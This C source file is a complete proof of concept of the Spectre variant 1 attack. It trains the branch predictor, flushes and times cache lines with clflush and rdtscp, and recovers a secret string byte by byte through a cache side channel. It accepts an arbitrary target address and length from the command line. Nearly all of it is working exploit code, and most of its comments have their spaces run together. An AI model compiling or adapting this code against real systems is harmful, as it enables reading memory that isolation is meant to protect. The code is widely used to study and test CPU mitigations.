#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>/* forrdtscpand clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>/* forrdtscpandclflush */
#endif
/********************************************************************
 Victimcode.
********************************************************************/
unsigned int array1_size=16;
uint8_t unused1[64];
uint8_t array1[160]={1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret= "The Magic Words are SqueamishOssifrage.";

uint8_t temp=0; /* Tonotoptimizeoutvictim_function() */

void victim_function(size_t x){
    if (x <array1_size){
        temp&=array2[array1[x] * 512];
    }
}

/********************************************************************
 Analysiscode
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cachehitiftime<=threshold */

/* Reportbestguessinvalue[0]andrunner-upinvalue[1] */
void readMemoryByte(size_t malicious_x,uint8_t value[2],
                    int score[2]){
    static int results[256];
    int tries,i, j, k,mix_i,junk=0;
    size_t training_x, x;
    register uint64_t time1,time2;
    volatile uint8_t *addr;

    for(i=0;i <256;i++)
        results[i]=0;
    for(tries=999;tries>0; tries--){
        /* Flusharray2[256*(0..255)]fromcache */
        for(i =0;i <256;i++)
        _mm_clflush(&array2[i * 512]);/* clflush */

        /* 5trainings(x=training_x)per attackrun(x=malicious_x) */
        training_x= tries% array1_size;
        for(j =29;j >=0;j--){
            _mm_clflush(&array1_size);
            for (volatile int z=0;z <100;z++){
            } /* Delay(canalsomfence) */

            /* Bittwiddlingtosetx=training_xifj% 6!=0
            * ormalicious_xifj %6==0 */
            /* Avoidjumpsincase thosetipoffthebranchpredictor */
            /* Setx=FFF.FF0000ifj%6==0,else x=0 */
            x = ((j%6)-1) & ~0xFFFF;
            /* Setx=-1ifj&6=0,elsex=0 */
            x =(x|(x>>16));
            x =training_x^(x&(malicious_x^training_x));
            /* Callthevictim! */
            victim_function(x);
        }

    /* Time reads. Mixed-upordertopreventstrideprediction */
    for(i =0;i <256;i++){
        mix_i=((i * 167)+13)&255;
        addr =&array2[mix_i * 512];
        time1 =__rdtscp(&junk);
        junk = *addr; /* Timememoryaccess */
        time2 = __rdtscp(&junk)-time1; /* Computeelapsedtime */
        if (time2<=CACHE_HIT_THRESHOLD && mix_i!=array1[tries% array1_size])
            results[mix_i]++; /* cachehit->score+1forthisvalue */
    }

    /* Locatehighest& second-highestresults */
    j= k=-1;
    for(i =0;i <256;i++){
        if (j<0||results[i]>=results[j]){
            k=j;
            j=i;
        } 
        else if(k<0||results[i]>=results[k]){
            k=i;
        }
    }
    if(results[j]>=(2 * results[k]+5) || (results[j]==2&&results[k]==0))
        break; /* Successifbestis> 2*runner-up+ 5or2/0) */
    }
 /* usejunktopreventcodefrombeingoptimizedout */
    results[0]^=junk;
    value[0]=(uint8_t)j;
    score[0]=results[j];
    value[1]=(uint8_t)k;
    score[1]=results[k];
 }

int main(int argc, const char **argv){
    size_t malicious_x=
        (size_t)(secret-(char *)array1); /* defaultformalicious_x */
    int i,score[2], len=40;
    uint8_t value[2];

    for(i=0;i< sizeof(array2);i++)
        array2[i]=1; /* writetoarray2toensureitismemorybacked */
    if (argc==3){
        sscanf(argv[1],"%p",(void **)(&malicious_x));
        malicious_x-=(size_t)array1; /* Inputvaluetopointer */
        sscanf(argv[2],"%d",&len);
    }

    printf("Reading%dbytes:\n",len);
    while (--len>=0){
        printf("Readingatmalicious_x= %p...", (void *)malicious_x);
        readMemoryByte(malicious_x++,value, score);
        printf("%s:",score[0]>=2 * score[1]?"Success": "Unclear");
        printf("0x%02X='%c'score=%d ",value[0],
            (value[0]>31&&value[0]<127?value[0]:'?'),score[0]);
        if(score[1]>0)
            printf("(secondbest: 0x%02Xscore=%d)",value[1],score[1]);
        printf("\n");
    }
    return (0);
}